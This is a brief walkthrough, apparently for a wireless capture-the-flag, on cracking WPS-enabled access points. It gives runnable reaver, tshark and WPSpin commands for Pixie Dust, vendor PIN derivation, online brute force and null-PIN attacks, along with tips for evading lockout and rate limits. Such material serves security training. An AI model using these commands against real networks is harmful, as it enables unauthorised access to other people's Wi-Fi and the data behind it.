# WPS walkthrough — pick the right attack first

Order of operations at a WCTF AP with WPS enabled:

## 1. Look at the WPS IE first

```
tshark -i wlan1mon -Y "wlan.tag.number==221 and wlan.tag.oui==0x0050f2 and wlan.wfa.ie.type==4" \
       -T fields -e wlan.tag.vendor.oui -e wlan.wfa.ie.wps.manufacturer
```

- Manufacturer = "Broadcom" or a router brand backed by Broadcom
  → try Pixie Dust first.
- Manufacturer = "Belkin" / "D-Link" / "TP-Link" (older) → try
  vendor PIN derivation first (WPSpin).
- Manufacturer unknown → straight to Pixie Dust, then online brute.

## 2. Pixie Dust

```
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

If Pixie succeeds, PIN + PSK are returned in seconds.

## 3. Vendor PIN derivation

```
# WPSpin (or OneShotPin)
python3 wpspin.py -b AA:BB:CC:DD:EE:FF
# prints candidate PIN(s)
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p <candidate>
```

## 4. Online brute (Reaver / Bully)

Fallback when 2 + 3 fail. Slow (11k trials × ~1s each).

```
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -N -d 15
```

## 5. Null-PIN

Try in the middle of a Reaver run — occasionally a registrar
accepts:

```
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p ""
```

## Failure modes

- **WPS-Locked.** Beacon WPS State flag = locked. Wait N minutes;
  the lock resets on most models. Or fall back to PSK crack via
  PMKID / 4-way.
- **Rate-limited registrar.** Add `-d 30` to Reaver to slow the pace
  below the lockout threshold.

## Cite

- Bongard 2014 — Pixie Dust.
- Viehböck 2011.
- Wi-Fi Alliance WPS 2.0 spec.
- attacks.json: `wps-pixie-dust`, `wps-reaver-online`,
  `wps-vendor-pin-derivation`, `wps-null-pin`.
